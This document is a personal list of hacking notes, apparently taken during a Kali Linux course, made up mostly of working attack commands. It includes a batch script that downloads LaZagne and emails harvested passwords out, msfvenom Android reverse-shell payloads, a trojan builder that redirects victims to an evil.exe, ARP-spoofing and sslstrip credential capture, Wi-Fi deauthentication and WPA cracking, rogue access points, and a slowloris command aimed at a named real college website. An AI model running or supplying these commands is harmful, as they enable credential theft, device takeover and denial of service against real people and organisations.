1. Whoami provides enhanced privacy, anonymity for Debian and Arch based linux distributions -- [text](https://github.com/owerdogan/whoami-project.git)
2. kalitorify
3. namp - to get all info of domain
4. whois --help use
5. recon-ng - usethis tool to get info
6. Netcraft - phishing protection tool
7. Maltigo - to gather information
8. Advanced Google Search
9. https://angryip.org/ - Use this and Scan Network
10. Nmap Use and scan all network
11. https://research.domaintools.com/ Using this find Domain info
12. http://web.archive.org/ This is Internet Archive and in this there is wayback machine use it .
13. use tools finger , enum4linux and much more to gather info
14. Google Advanced Search
15. Nmap Used to Scan (namp -sC <IP> , nmap --script http-headers <IP>, nmap --script default,broadcast <IP>, nmap --script "ssh-\*" <IP>, nmap --script banner <IP>, namp --script dns-brute <IP>)
16. nslookup(nslookup > set Type=NS Google.com), dig(dig google.com AAAA/NS)
17. SMB Enumuration vulneribility
18. Reconnaissance : Multigo Use Properly
19. Other Reconnaissance Tech : find info through social media or E-mail etc
20. Make userfriendly wit multigo tool
21. Information Gathering Tool - dmitry -h > IMP
22. WEP encryption
23. CISCO Packet tracker use to semulate all process .
24. Convert wifi in monitor mode > ifconfig wlan0 down > iwconfig wlan0 mode monitor > ifconfig wlan0 up
25. WIFI tools > airodump-ng wlan0 > airodump-ng --bssid <bssid> --channel <CH> --write test --upc wlan0 || aireplay-ng --deauth 4 -a <bssid> -c <client bssid> wlan0 ||Handshake captured > aircrack-ng -w /path/to/wordlist.txt web-01.cap || Hidden Network will be find by disconnecting clients of hidden network you will get wifi Name. || aircrack-ng web-01.cap (to decript passkeyonly for WPA)
26. MAC Changer > ifconfig wlan0 down > ifconfig wlan0 hw ether 00:11:22:33:44:55 > ifconfig wlan0 up
27. cracking WPA/WPA2 Enterprise > apt-gwt install libnl-3-dev > apt-get install libssl-dev > apt-get install hostapd-wpe > nano /etc/hostapd-wpe/hostapd-wpe.conf > airmon-ng check kill > hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf > cat /usr/share/wordlists/rockyou.txt | asleap -c <challenge> -R <Response> -W-
28. Ganing Access to Captive Portals > sudo apt-y install sipcalc nmap || wget https://raw.githubusercontent.com/systematicat/hack-captive-portals/master/hack-captive.sh > sudo chmod u+x hack-captive.sh > sudo chmod u+x hack-captive.sh > sudo ./hack-captive.sh > • Captive Portal Signal Available to Other Devices > Install additional packages: sudo apt install wpasupplicant > sudo apt install haveged hostapd git util-linux procps iproute2 iw dnsmasq iptables > git clone https://github.com/oblique/create_ap > cd create_ap > sudo make install > cd .. && rm -rf create_ap > • Stop Network Manager: sudo systemctl stop NetworkManager > sudo airmon-ng check kill • Captive Portal Signal Available to Other Devices > sudo ip link set eth0 down > gedit wpa_sup.conf > sudo wpa_supplicant -i wlan0 -c wpa_sup.conf > wlan0: CTRL-EVENT-CONNECTED - Connection to 88:dc:96:55:19:e4 completed [id=0 id_str=] > sudo dhclient wlan0 > sudo ./hack-captive.sh > iw dev > sudo create_ap wlanl wlane HackWare MiAlrules > • Captive Portal Signal Available to Other Devices > wlan0: AP-ENABLED > sudo create_ap > sudo create_ap wlan1 wlan0 KaliTut Qi*54s/n5 > sudo create_ap --ieee80211n wlan1 wlan0 KaliTut Qi*54s
29. Bypass Captive Protocals > Theft of MAC and IP addresses > traceroute suip.biz > • Captive Portal Using UDP > • Run the dig command several times for different hosts, for example, to get the IP host: > dig @8.8.8.8 ya.ru +short > • To get the google.com host IP: dig @8.8.8.8 google.com +short > • Theft of Credentials of Legitimate Users > • Stop the Network Manager and kill processes > sudo systemctl stop NetworkManager > sudo airmon-ng check kill > • Putting the card into monitor mode > sudo ip link set wlano down > sudo iw wlan0 set monitor control > sudo ip link set wlano up > Run airodump-ng > sudo airodump-ng wlan0 > sudo airodump-ng --channel 10 > -w /root/cap wlan0 > Use Wireshark to get username and pass from cap-01.cap file
30. ARP Spoofing > Use Ettercap tool > User ARP Spoofing > Capture the Traffic in Wireshark and get username and pass from it .
31. SSL Attack with MITM > • 192.168.1.2 >> Victim Computer (Windows 7) > • 192.168.1.1 >> Gateway Address > • 192.168.1.3 >> Attacker Computer (Kali Linux) > echo "1" > /proc/sys/net/ipv4/ip_forward > iptables -t nat -A PREROUTING -p tcp -dport -dport 80 -j REDIRECT -to-port 8080 > python sslstrip.py -1 8080-w/root/Masaustu/ssllog.log > arpspoof -i eth0 -t 192.168.1.2 -r 192.168.1.1 > cat ssllog.log | grep pass
32. Keylogger in Metasploit framework > sysinfo > ps > grtpid > metigate 772 > getpid > keyscan start > keyscan dump > background > search lockout > sessions -i > set sessions 1 > Use Metasoploit > show options > set PID 1504 > exploit .
33. Pivoting > use exploit/windows/browser/ms10_002_aurora > show options > set URLPATH >set payload windows/metwrpreter/reverse_tcp > set LHOST > exploit -j > sessions -l 1 > # > run autoroute -h > run autoroute -s <session> > run autoroute -p > getsystem > run hashdump > use auxiliary/scanner/portscan/tcp > show options > set RHOST , RPORT, THREADS > run > use exploit/windows/smb/psexec > show options > do all .
34. MITM Proxy : install https://mitmproxy.org/ -- mitmproxy, mitmdump, mitmweb > script.py >> #!/usr/bin/python \n import mitmproxy /n def response(flow): print(f**\*\***\*\***\*\***\_\_**\*\***\*\***\*\***CONTENTS OF THE FLOW**\*\*\*\***\_\_\_**\*\*\*\***AnFlow.response.content)\n") > Save > ./mitmdump -s script.py > || > script.py >> #!/usr/bin/python \n from mitmproxy import http; def response(flow: http.HTTPFlow) -> None: flow.response.content = flow.response.content.replace(b"</body>", b'</body><script>alert("checking xss")</script>') > ./mitmdump -s script.py
35. Custom script and common Attacks : ping 198.168.56.101 -c 1 > ip.txt > cat ip.txt > create file ipsweep.sh > #!/bin/bash \n for ip in seq 1 254; do \n ping -c 1 $1.$ip | grep "64 bytes" | cut -d .. -f4tr-d":" & \n done > ./ipsweep.sh 198.168.56.101 > iplist.txt > use some nmap scripts .
36. Reconnaissance : active & passive
37. Rogue Access Point Start & Setup : sudo apt update && sudo apt install -y aircrack-ng hostapd dnsmasq && sudo airmon-ng start wlan0 && sudo systemctl stop NetworkManager && echo -e "interface=wlan0\ndriver=nl80211\nssid=FakeAP\nhw_mode=g\nchannel=6\nwmm_enabled=0\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nwpa=2\nwpa_passphrase=your_password\nrsn_pairwise=DISABLED" | sudo tee /etc/hostapd/hostapd.conf && sudo hostapd /etc/hostapd/hostapd.conf & echo -e "interface=wlan0\ndhcp-range=192.168.1.50,192.168.1.150,255.255.255.0,24h" | sudo tee /etc/dnsmasq.conf && sudo dnsmasq -C /etc/dnsmasq.conf && sudo sysctl -w net.ipv4.ip_forward=1 && sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE && sudo iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT && sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT >> Stopping the Rogue Access Point : sudo systemctl start NetworkManager && sudo airmon-ng stop wlan0mon && sudo killall hostapd dnsmasq
38. Use airgeddon tool (IMP)
39. Use of Vertual Machine
40. use iproute2 && macchanger use to change mac address
41. Network Scanning Tools : Nessus vulnerability scanner , Skipfish , vega , Nmap Script Engine(NSE), Metasploit Auxilary Module , OWASP Zap .
42. Techniques to Search vulnerability : traceroute www.google.com , hping3 --scan 80/444 -S -t 11 www.google.com
43. Tools Used for Scanning : ping 198.168.56.101 , nmap -sP -v 198.168.56.101, nmap -sP -PE -PA21,23,80,3389 198.168.56.101, hping3 -c l -V -p 80 -s 5050 -A 192.168.56.101 (if no feedback that is IDS is there), hping3 -l 198.168.56.101 (Learn Nmap and Hping3)
44. nikto -h 198.168.56.101 -p 80 -w niktoresult -F txt
45. Nmap Demonstration : Read all Documentation of Nmap .
46. Angry IP and Nmap Demonstration : nmap 198.168.56.101 --script default,safe -v -o ram -sV > nmap -vvv --script=banner 198.168.56.101, nmap -Pn -script=http-xssed 198.168.56.101 , nmap -Pn --script=http-xssed 198.168.56.101, nmap -Pn --script=http-sitemap-generator 198.168.56.101, nmap -v --script "http-\*" 198.168.56.101, nmap -n -Pn -p 80 --open -sV -vvv --script banner,http-title -iR 100 , nmap -Pn --script=dns-brute 198.168.56.101
47. Netcat : nc 198.168.56.101 4444 > nc.txt
48. hping3 : hping3 -1 -c 5 198.168.56.101 ,
49. Firewalk : sudo apt install firewalk > sudo firewalk -S 1-8081 -i eth0 -n -p TCP 192.168.56.1 192.168.56.101
50. Finding Subdomains using Knock > https://github.com/guelfoweb/knock.git > it will show all subdomain and much more .
51. Automated Vulneribility Scanning Tools : Nessus, Skipfish, VEGA
52. Detail info aboute Routing Table > route print
53. Armitage > it is very usefull tool > run by following commd > armitage
54. metasploit GUI Community : it very important to scan and get vulneribilities and exploits also > downlode it and use properly.
55. DOS & DDOS Perfrom Tool > LOIC : A network stress testing application
56. Ping of Death Attack : ping -h > ping google.com > much more .
57. create Zombii computers , botnets much more .
58. DDoS Using Botnet Tool : https://github.com/epsylon/ufonet.git > downlode and Use .
59. Slow Loris DDoS Attack : https://github.com/0xc0d/Slow-Loris.git and https://github.com/gkbrk/slowloris.git > downlode and Use it properly it used for website down by attack > by following commands > python slowloris.py https://rgcc.ac.bd -s 500 > by this commmd all website go down .
60. Dos & DDoS Attack Perform using hping3 > hping3 --flood -S --rand-source 192.168.56.101
61. netdiscover tool like nmap to gather info ad it is preinstalled in kali > netdiscover -r 192.168.56.101/14 > netdiscover -l ip.txt
62. MITM : sudo sysctl -w net.ipv4.ip_forward=1 > Ettercap > set targets > tcpdump -i wlan0 -n port 80 and host 198.168.56.111 >> mitmf Tool/software || Cain & Abel Tool > Password recovery tool leveraging network sniffing, brute-force attacks, and more for security professionals > | Ettercap Used | > #Enable IP Forword on the computer > echo 1 > /proc/sys/net/ipv4/ip_forward > iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 > arpspoof -i eth0 -t <target IP> -r <gatewway IP> > #Keep the previous terminal running and open a #new terminal sslstrip -1 8080 I > #Credentai will be saved in sslstip.log nano ssistip.log
63. Sniffing : Wireshark Used , XArp Tool also > arpspoof -t 198.2.0.1 192.168.56.101
64. Network Hacking Tools : Wireshark, Nikto, Nessus remote security scanner, Zenmap , remote security scanner
65. yarsinia Tool use for DNS Poisining > DNS Poisoning . || DNS POsining for setting up Proxy Server > video 163
66. Proxy Setup in browser and Buy From Third Party also and use to hide your self.
67. DNS Poisining : Usinf Ettercap and SET Toolkit to perfrom this attack .
68. MITM Proxy : mitmweb > go on browser by clicking link > in kali > install certificate and set proxy setting in browser > in commd shell do this > mitmweb --allow-hosts '\*.google.com' > other install using https://github.com/mitmproxy/mitmproxy.git > and run and explain > mitmproxy --version > mitmproxy > curl --proxy http://localhost:8080 http://google.com > press enter and also left and right for more details .
69. Trojan : install trojan from https://github.com/z00z/TrojanFactory.git and https://github.com/threatland/TL-TROJAN.git and use it to hack another devices. > python trojan_factory.py --help > python trojan_factory.py -f https://pubs.usgs.gov/dds/dds-057/ReadMe.pdf -e http:982.166.23.19/evil.exe -o var/www/html/ReadMe.exe -i root/downlode/pdf.ico -z > ettercap -Tq -M arp:remote -i wlan0 -S /10.45.67.86// /10.45.67.86/ > .mitmdump -s root/basic.py --transparent > iptables -t nat -A PREROUTING -p tcp --destination -port 10 -j REDIRECT --to-port 8080 > from mitmproxy import http > def request(flow: http.HTTPFlow) -> None: > if flow.request.host != "10.20.215.8" and flow.request.pretty_url.endswith("."): > print("[+] Got interesting flow") > flow.response = http.HTTPResponse.make(301,b"",{"Location": "http://10.20.215.8/file.exe"} ) > || https://github.com/AlessandroZ/LaZagne.git this is credential recovery project if usfull . >> Advanced Man in the Middle Attack can be done using BeeF Tool (imp).
70. SSL Srips and Advanced Uses of Etttercap : use Ettercap for this >> echo 1> /proc/sys/net/ipv4/ip forward > iptables iptables -t nat -A PREROUTING tcp-destination-port 80 -j REDIRECT --to-port 8080 > arpspoof -1 ethe 192.168.1.105 192.168.1.102 > arpspoof ethe 192.168.1.105 192.168.1.102 > ssistrip- 8080 .
71. Cain and Abel Demonstration
72. Sidejaking and Sniffing Demonstaration : open Ettercap-G and set targets > hamster-sidejack run commd > set proxy in browser > next commd ferret-sidejack > ferret-sidejack -i eth0 > Sniffing Example : sysctl -w net.ipv4.ip_forword=1 > ettercap-G > tcpdump -i eth0 -n port 80 and host 192.168.56.101
73. Basic of Session Hijacking : use tools such as Fiddler web Debugger > https://github.com/elmah/Elmah.git by using this tool you can get much more info
74. Automated Session hijacking : Session id and much more hijacking was possible using burpsuit > Acunetix web Vulneribility Scanner toll used for web vuln scan
75. Session hijacking : cookie editor extention doenlode and get cookie .
76. Static and Binary code Analysis tool : https://github.com/NationalSecurityAgency/ghidra.git use it priperly and it is developed by NSA
77. • Exploit Websites : > https://www.exploit-db.com > http://www.rapid7.com/db/ > http://0day.today/ > https://cxsecurity.com/exploit/
78. Debugger : tools > 1) Immunity Debugger ||2) immunity Debugger with sika boom also avalable.
79. Python-based interactive packet manipulation program & library tool : https://github.com/secdev/scapy.git
80. EIP & ESP Bugs find but writing script in python .
81. write all the payloads and scripts that make error and give unethical access .
82. To convert your machine to FTP Server > Ability FTP Server > it incorporates many advanced features with an easy to use interface. This flexible FTP server usually only takes a couple of minutes to configure. Offering power control over accounts, the software comes with advanced monitoring to enable you to view and study activity. The server includes a Remote Admin facility which allows total control of the server from any location. Other features include 256-bit SSL encryption, anti-hammering and much more.
83. Prebuild Hashing in windows : Certutil -hashfile (Path_to_file) [HashAlgo] > Using OpenSSL >> Encrypt a File : openssl enc -aes-256-cbc -salt -in file.txt -out file.txt.enc -k yourpassword > Decrypt a File : openssl enc -d -aes-256-cbc -in file.txt.enc -out file.txt -k yourpassword.
84. Search & Work : Cyptographic tools, Disk Encryption tools , Crypanalysis Tools
85. Password Hacking ::> 1) Hydra : use it to gess the pass and usenames . 2) John the Ripper : Bruteforce the usernames and passwords . 3)Medusa : Another Password cracking tool the htchydra 4) Keylogger : A keylogger that sends emails with log attachment > https://github.com/Sirius-Black4/keylogger.git > use it and test.
86. Best kali Tools to crack Password Authentication : 1) John the Ripper > john 192.168.56.101.pwdump > john --worldlist=/usr.share/wordlist/rockyou.txt 192.168.56.101.pwdump > john --rules --worldlist=/usr.share/wordlist/rockyou.txt 192.168.56.101.pwdump > unshadow pass-file.txt shadow-file.txt > unshadow pass-file.txt shadow-file.txt>unshadowed.txt > john --worldlist=/usr.share/wordlist/rockyou.txt unshadowed.txt .
87. Hash Password Cracking : echo -n "Hello" | md5sum | tr -d "-" >> target_hash.txt > cat target_hash.txt > hashcat -m 0 -a 0 -o crack.txt target_hash.txt /usr/share/wordlists/rockyou.txt
88. Bypass Windows Password : fdisk -l && ntfsfix /dev/sda2 && cd /media/<Media No.>/Windows/System32/config && bkhive SYSTEM /root/Desktop/system && samdump2 SAM /root/Desktop/system > /root/Desktop/hashes.txt && pwdump SYSTEM SAM > /root/Desktop/hashes.txt && wine "c:\pwdump8.exe" -f SYSTEM SAM && cd /root/Desktop && cat hashes.txt && john --format=nt2 --users=UserName hashes.txt
89. || Ophcrac || is a free Windows password cracker based on rainbow tables. It is a very efficient implementation of rainbow tables done by the inventors of the method. It comes with a Graphical User Interface and runs on multiple platforms. > Rainbow Table Ganerate commd > rtgen <hash_algorithm> <charset> <plaintext_len_min> <plaintext_len_max> <table_index> <chain_len> <chain_num> <part_index> >>> rtgen lm loweralpha 1 7 0 10000 20000 0 > rtgen ntlm mixalpha-numeric 1 7 0 10000 20000 0 > rtgen md5 mixalpha-numeric 1 7 0 10000 20000 0 > rtsort .
90. Wordlist ganarator tool : Crunch 3 6 1234567890 -o list.txt > crunch 10 10 @@@@123 list1.txt > crunch 4 8 1234abcd list2.txt
91. Ncrack to crack Username and Password > ncrack && ncrack -p <port> && ncrack <target1> <target2> <target3> && ncrack -p <port> --user <username> --pass <password_list> && ncrack -p 3389 && ncrack -T<speed> && ncrack -oN <output_file> && ncrack -p 21 && ncrack -v
92. Wbapplication Hacking Using : SQL Injection and BurpSuit (imp to learn)
93. Shodan Search Engine is most powerfull search engine in the world ised by cyber security (Ethical Hackers)
94. External Vernability Scanning Tool : Shodan, Nmap, Qualys, Nessus.
95. NetSparker Downlode : https://www.freesoftwarefiles.com/utilities/netsparker-professional-4-8-free-download/ from this link downlode tool and Use it librarly.
96. Acunetix Downlode and use it libraly explore all features > Downlode burpsuit and Explain all functions.
97. OWASP TOP 10 : it best project to test your skills ubderstand all things and apply it and learn from it.
98. best website to decode password > https://www.base64decode.org/ > use it to decode hash > Burpsuit is also inbuilt feature to to decode these feature.
99. Sqlmap used to get all info by following commands : sqlmap -u "http://example.com/vulnerable.php?id=1" >> sqlmap -u "http://example.com/vulnerable.php?id=1" --cookie="PHPSESSID=your_session_id" >> sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs >> sqlmap -u "http://example.com/vulnerable.php?id=1" -D database_name --tables >> sqlmap -u "http://example.com/vulnerable.php?id=1" -D database_name -T table_name --columns >> sqlmap -u "http://example.com/vulnerable.php?id=1" -D database_name -T table_name --dump >> sqlmap -u "http://example.com/vulnerable.php" --data="param1=value1&param2=value2" >> sqlmap -u "http://example.com/vulnerable.php?id=1" --proxy="http://127.0.0.1:8080" >> sqlmap -u "http://example.com/vulnerable.php?id=1" --user-agent="Mozilla/5.0" >> sqlmap -u "http://example.com/vulnerable.php?id=1" --technique="BEUSTQ" >> sqlmap -u "http://example.com/vulnerable.php?id=1&param2=value2" >> sqlmap -m urls.txt --batch >> sqlmap -u "http://example.com/vulnerable.php?id=1" --dump --output-dir=/path/to/output >> sqlmap -u "http://example.com/vulnerable.php?id=1" --auth-type=basic --auth-cred="username:password" >> sqlmap -u "http://example.com/vulnerable.php?id=1" --dump-all >> sqlmap -u "http://example.com/vulnerable.php?id=1" --threads=5 >> sqlmap -u "http://example.com/vulnerable.php?id=1" --banner >> sqlmap -u "http://example.com/vulnerable.php?id=1" --privileges >> sqlmap -u "http://example.com/vulnerable.php?id=1" --technique="B" --dump >> sqlmap -u "http://example.com/vulnerable.php?id=1" --data="param1=value1' OR '1'='1"
100. Beast Tool : The BEAST tool exploits vulnerabilities in SSL/TLS protocols, allowing attackers to decrypt HTTPS traffic. It's primarily used for testing the security of SSL/TLS implementations and demonstrating weaknesses in older encryption methods. While largely historical, it highlights the need for secure configurations in modern systems.
101. Viel framework : Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions >> https://github.com/Veil-Framework/Veil.git > install and run properly.
102. Generate Gmail Emailing Keyloggers to Windows : https://github.com/4w4k3/BeeLogger.git Clone an install and rum and get info .
103. The LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer : https://github.com/AlessandroZ/LaZagne.git clone this and use it libraly imp project. i make a script to make lazagne remotely send me info by following commads : @echo off && set downloadURL=http://192.168.1.103/evil-files/lazagne.exe && set email=akash@gmail.com && set password=abc123abc123 && set exeFile=%TEMP%\proc.exe && set logFile=%TEMP%\proclog.txt && set arguments=all && powershell (new-object System.Net.WebClient).DownloadFile('%downloadURL%', '%exeFile%'); %exeFile% %arguments% > %logFile% && del %exeFile% && powershell $SMTPServer='smtp.gmail.com'; $SMTPInfo=New-Object Net.Mail.SmtpClient($SMTPServer,587); $SMTPInfo.EnableSsl=$true; $SMTPInfo.Credentials=New-Object System.Net.NetworkCredential('%email%','%password%'); $ReportEmail=New-Object System.Net.Mail.MailMessage; $ReportEmail.From='%email%'; $ReportEmail.To.Add('%email%'); $ReportEmail.Subject='Lazagne Report'; $ReportEmail.Body='Lazagne report in the attachments.'; $ReportEmail.Attachments.Add('%logFile%'); $SMTPInfo.Send($ReportEmail) && del %logFile%
104. Ophcrack : Ophcrack is a Windows password cracker based on a time-memory trade-off using rainbow tables. This is a new variant of Hellman's original trade-off, with better performance. It recovers 99.9% of alphanumeric passwords in seconds. > https://sourceforge.net/projects/ophcrack/ downlode and use it libraly.
105. Thefatrat a massive exploiting tool : Easy tool to generate backdoor and easy tool to post exploitation attack like browser attack and etc . This tool compiles a malware with popular payload and then the compiled malware can be execute on windows, android, mac . The malware that created with this tool also have an ability to bypass most AV softw… > https://github.com/screetsec/TheFatRat.git > download from here use it libraly.
106. Stenography : sudo apt-get install steghide > and use it libraly .
107. SVWA Use this and test your Skills .
108. Viel Framwork is very important use it imp .
109. Social Engineering : setoolkit . run and use it libraly imp tool kit .
110. Veil, msfvenom, msfconsole > use all of this and connect all machines using metasploit framework.
111. Free fake Mailer Web : https://emkei.cz/ > go here and use it to fack mail send (IMP to use).
112. to convert ip to domain you can use bitly for this .
113. Website Hacking and testing : local file inclusion find the log file and password file.
114. Use Armitage all tool explore and use it properly.
115. Weevely is a stealthy web shell tool in Kali Linux that allows remote command execution on compromised web servers through uploaded PHP scripts. > weevely generate <password> <output_file> && weevely <target_url> <password> (imp tool to get shell access)
116. SQL : learn about it full and understand the sqlmap. > blind SQL is also usefull for user and much more info gather.
117. Enumuration with ASCII Value write code all for this.
118. SQL Injection vulnerabilites can cause a lot of damage to a web application. A malicious user can possibly view records, delete records, drop tables or gain access to your server. SQL Inject-Me is Firefox Extension used to test for SQL Injection vulnerabilities. > https://github.com/SecurityCompass/SQL-Inject-Me.git > downlode and use it linraly.
119. Havij Advanced Sql injection Tool : https://www.darknet.org.uk/2010/09/havij-advanced-automated-sql-injection-tool/#google_vignette > downlode tool and use it libraly. || Netspakar is also used for this install it and use it libralt.
120. Vulneribility Sacnner : Snyk CLI scans and monitors your projects for security vulnerabilities. > downlode from here and use it libaraly > https://github.com/snyk/cli.git > learn and use it.
121. Android Hacking : use https://github.com/Androguide/dsploit.git > use it properly .
122. develop payload and hack android os by this commonds : msfvenom p android/meterpreter/reverse_tcp LHOST-192.168.1101 LPORT-443 R>apps.apk > it develop a payload and it sent to victim device and run this on victim machine. > open new terminal and write > msfconsole > use exploit/multi/handler > set payload android/meterpreter/reverse_tcp > show options > set LHOST && set LPORT > exploit . > you had root acess of android device.
123. install > file.exe > in linux machine by using > wine file.exe
124. if you want to injet payload in any app install apk file > notes.apk installed > clone this repo tool > https://github.com/0-ali/metasploit-apk-embed-payload.git > put your apk file in v0.2 folder > to run this tool you need this install in your pc >sudo gem install text-table > sudo gem install colorize > sudo apt install apktool > roby apk-embed-payload.rb notes.apk android/meterpreter/reverse_tcp LHOST-192.168.1.101 LPORT-46712 > drag that apk and past in you phone > open new terminal and write > msfconsole > use exploit/multi/handler > set payload android/meterpreter/reverse_tcp > show options > set LHOST && set LPORT > exploit . > you had root acess of android device.
125. dSPloit > it is a android application that make all actions from mobile ex, port scan, MITM, DNS Scan or much more > dSploit offers a comprehensive catalog of tools for IT and security experts to perform network security assessments right on their mobile phone. At launch, you’ll be able to map your network, track hosts operating systems, search for vulnerabilities, crack logon procedures of TCP protocols, real-time traffic manipulation, and more. It makes it an easy-to-use and convenient security tool to have.
126. Bugtroid FREE > Rediscover security on Android, more than 200 ethical hacking tools > downlode and enjoy
127. The Official USB Rubber Ducky Payload Repository > https://github.com/hak5/usbrubberducky-payloads.git . use it and learn much more.
128. The Official Bash Bunny Payload Repository > https://github.com/hak5/bashbunny-payloads.git . run and use it libraly.
129. HoneyDrive : HoneyDrive is the premier honeypot Linux distro. It is a virtual appliance (OVA) with Xubuntu Desktop 12.04.4 LTS edition installed. It contains over 10 pre-installed and pre-configured honeypot software packages such as Kippo SSH honeypot, Dionaea and Amun malware honeypots, Honeyd low-interaction honeypot, Glastopf web honeypot and Wordpot, Conpot SCADA/ICS honeypot, Thug and PhoneyC honeyclients and more. Additionally it includes many useful pre-configured scripts and utilities to analyze, visualize and process the data it can capture, such as Kippo-Graph, Honeyd-Viz, DionaeaFR, an ELK stack and much more. Lastly, almost 90 well-known malware analysis, forensics and network monitoring related tools are also present in the distribution. > https://sourceforge.net/projects/honeydrive/ > downlode and use properly .
130. The Artillery Project : The Artillery Project is an open-source blue team tool designed to protect Linux and Windows operating systems through multiple methods. > https://github.com/BinaryDefense/artillery.git . downlode and use properly .
131. Artillery-Event-dll : Event dll for use with Artillery from Binary Defense > https://github.com/russhaun/Artillery-Event-dll.git > downlode and use properly.
132. Security Onion 2 : Security Onion is a free and open platform for threat hunting, enterprise security monitoring, and log management. It includes our own interfaces for alerting, dashboards, hunting, PCAP, detections, and case management. It also includes other tools such as osquery, CyberChef, Elasticsearch, Logstash, Kibana, Suricata, and Zeek. > https://securityonionsolutions.com/software > downlode and use properly.
133. php-exploit-scripts : A collection of PHP exploit scripts, found when investigating hacked servers. These are stored for educational purposes and to test fuzzers and vulnerability scanners. Feel free to contribute. > https://github.com/mattiasgeniar/php-exploit-scripts.git > downlode and use properly .
134. Downlode servers and use it to setup firewalls and much more that make possible to handle all operations
135. Learn About STEM All operations.
136. IOS Hacking application : ClassDump, ClassDumpZ, Clutch, Cycript, Frida, radare2, Hopper, IDA Pro. > by using hack IOS devices .
137. checkra1n : checkra1n is Jailbreak for iPhone 5s through iPhone X, iOS 12.0 and up
138. develop a Kaylogger, Malware, trojan, virus and much more tool.
139. learn C++ and C and DSA And Python develop a best projects.
140. Learn Nmap and Wireshark deeply.
141. nmap Scripting engine use and develop a script also.
142. SSH Tunnling : ssh -L local_port:remote_host:remote_port user@ssh_server
143. develop a server and setup firewall and much more connect systems.
144. HxD : HxD is a freeware hex editor, disk editor, and memory editor developed by Maël Hörz for Windows. It can open files larger than 4 GiB and open and edit the raw contents of disk drives, as well as display and edit the memory used by running processes > go on virus total web and check malwares amd much more > https://www.virustotal.com/gui/ > test you media.
145. Malware Analysis : Static Analysis and Dynamic Analysis
146. juice-shop : OWASP Juice Shop: Probably the most modern and sophisticated insecure web application > https://github.com/juice-shop/juice-shop.git > downlode from thre and use it properly.
147. SAP HANA : SAP HANA is an in-memory database that enables real-time analytics, data processing, and application development for business applications. > downlode and use it reatime
148. Computer forensics Tool : ProDiscover, Access Data FTK, Encase Forensics,
149. Data Recovery Tool : UndeletePluse > https://www.undeleteplus.com/download.php > Downlode from here and use properly.
150. cuckoo : Cuckoo Sandbox is an automated dynamic malware analysis system > https://github.com/cuckoosandbox/cuckoo > downlode amd use it and learn about it.
151. OllyDbg : An open-source user mode debugger for Windows. Optimized for reverse engineering and malware analysis. > https://github.com/x64dbg/x64dbg.git . downlode and use it is.
152. Best Computer Forensic Tools : Disk analysis: Autopsy/the Sleuth Kit. ... > Image creation: FTK imager. ... > Memory forensics: volatility. ... > Windows registry analysis: Registry recon.... > Mobile forensics: Cellebrite UFED.... > Network analysis: Wireshark.... > Linux distributions: CAINE.
153. Kali Linux forensics > dd Command : Purpose: Copies and converts files or disk images. Command: dd if=/dev/sda of=/path/to/disk_image.img bs=4M status=progress || dc3dd Command : Purpose: Enhanced version of dd for forensic data copying with error logging and hashing. Command: dc3dd if=/dev/sda of=/path/to/disk_image.img hash=md5
154. Best Github Account to help Bug Bounty : https://github.com/jhaddix > go on this acount and much more to learn about him and his tools.
155. Top 25+ tools for bug hunters : Vmawere, VertualBox, bWAPP, Wappalyzer, Firebug for firefox, Hackbar v2 add on firefox, User-Agent Switcher add-on for firefox, Sublist3r : https://github.com/aboul3la/Sublist3r.git , WPScan , CMSmap : https://github.com/dionach/CMSmap.git , OSINT Framework : https://github.com/lockfale/OSINT-Framework.git - https://osintframework.com/ ,
156. Subdomain Ennumuration tool : https://github.com/Findomain/Findomain.git || Subdomain Takeover tool : https://github.com/haccer/subjack.git || sslstrip : https://github.com/moxie0/sslstrip.git
157. Bug Bounty Start : iptables --flush > sslstrip >> open another terminal and type > iptables -t nat -A PREROUTING -p tcp -destination-port 80 REDIRECT -to-port 10000 >> open another terminal and run > https://github.com/EONRaider/Packet-Sniffer.git > run > python packet_sniffer.py > use the browser and serch for the web >
158. Earn money buy : Frelancer.com , Fiverr.com(important),cnbc.com
159. web > surface web - windows, linux || deep web - Quabes OS || Dark Web - Tail OS || Biggner - Ubantu OS .
160. if you want to know albout all linux os go on > https://distrowatch.com/ and find much more distributions.
161. Bitcoin : digital Currancy > https://bitcoin.org/en/bitcoin-core/ >|| Blokchain.com > Earn Free Bitoin : Freebitco.in >
162. Create Dark web website and and publish it | See the artical that help you to do this .
163. PGP Tutorials : gpg4win Software used - https://www.gpg4win.org/ > downlode from here and use it properly. for encrypt and decrypt.
164. Learn Python
165. Wing Python IDE i think this is usefull .
166. Matasploit Framework use
167. UPX - the Ultimate Packer for eXecutables : https://github.com/upx/upx.git > downlode and use it to compress your paylode .
     Done ||

uninstalled apps from pc

1. Acustic vulneribility scanner
2. Meltigo
3. Nmap

learn about

1. openssl
